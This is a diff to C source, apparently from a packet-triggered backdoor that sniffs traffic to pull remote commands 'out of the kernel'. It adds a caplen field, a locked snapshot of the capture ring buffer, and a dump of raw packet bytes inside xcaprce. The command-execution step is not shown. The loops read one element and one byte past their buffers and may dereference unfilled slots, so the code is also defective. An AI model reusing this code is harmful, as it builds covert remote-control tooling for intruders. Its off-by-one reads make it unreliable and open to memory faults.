@@ -40,11 +40,13 @@
 typedef struct xcap_saddr_packet {
   struct in_addr *saddr;
   unsigned char *packet;
+  unsigned int caplen;
   // TODO add other fields from packet parsing below!
   // TODO consider perfomance hits of packet parsing before/after (probably just do saddr)
 } xcap_saddr_packet;
 
 xcap_saddr_packet *xcap_ring_buffer[XCAP_BUFFER_SIZE];
+xcap_saddr_packet *xcap_ring_buffer_snap[XCAP_BUFFER_SIZE];
 int xcap_pos = 0;
 int xcap_collect = 1;
 pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
@@ -137,6 +139,7 @@ void *xcap(void *v_dev_name) {
     xpack->saddr = malloc(sizeof (struct in_addr));
     memcpy(xpack->packet, packet, header.caplen);
     memcpy(xpack->saddr, &iph->ip_src, sizeof (struct in_addr));
+    xpack->caplen = header.caplen;
     pthread_mutex_lock(&lock);
     xcap_ring_buffer[xcap_pos] = xpack;
     pthread_mutex_unlock(&lock);
@@ -147,6 +150,33 @@ void *xcap(void *v_dev_name) {
   return NULL;
 }
 
+// snapshot is thread safe
+int snapshot_count = 0;
+int snapshot() {
+  if (snapshot_count) {
+    printf("**MEMORY LEAK**");
+    exit(1);
+  }
+  pthread_mutex_lock(&lock);
+  boopprintf("Snapshot:\n");
+  for(int i = 0; i <= XCAP_BUFFER_SIZE; i++) {
+    // TODO Check if buffer is "full" we could be running before we cycle!
+    struct xcap_saddr_packet *xpack = malloc(sizeof (xcap_saddr_packet));
+    xpack->packet = malloc(xcap_ring_buffer[i]->caplen);
+    xpack->saddr = malloc(sizeof (struct in_addr));
+    memcpy(xpack->packet, xcap_ring_buffer[i]->packet, xcap_ring_buffer[i]->caplen);
+    memcpy(xpack->saddr, xcap_ring_buffer[i]->saddr, sizeof (struct in_addr));
+    xpack->caplen = xcap_ring_buffer[i]->caplen;
+    xcap_ring_buffer_snap[i] = xpack;
+    boopprintf(".");
+  }
+  boopprintf("\n");
+  pthread_mutex_unlock(&lock);
+  snapshot_count++;
+  return 0;
+}
+
+
 // xcaprce is the main "interface" for pulling an RCE
 // out of the kernel.
 //
@@ -155,6 +185,19 @@ void *xcap(void *v_dev_name) {
 int xcaprce(char search[INET_ADDRSTRLEN], char *rce) {
   // Todo setup in_addr structs as needed
   boopprintf("  -> Search xCap Ring Buffer: %s\n", search);
+
+  snapshot(); // Thread safe snapshot of the ring buffer!
+
+  boopprintf("Dumping packet snapshot:");
+  for(int i = 0; i <= XCAP_BUFFER_SIZE; i++) {
+    const u_char *packet;
+    packet = xcap_ring_buffer_snap[i]->packet;
+    for (int j = 0; j <= xcap_ring_buffer_snap[i]->caplen; j++) {
+      printf("%c", packet[j]); // Print the DPI of the packet!
+    }
+  }
+
   return 1;
   // return 0; // When we found our RCE!
 }
+
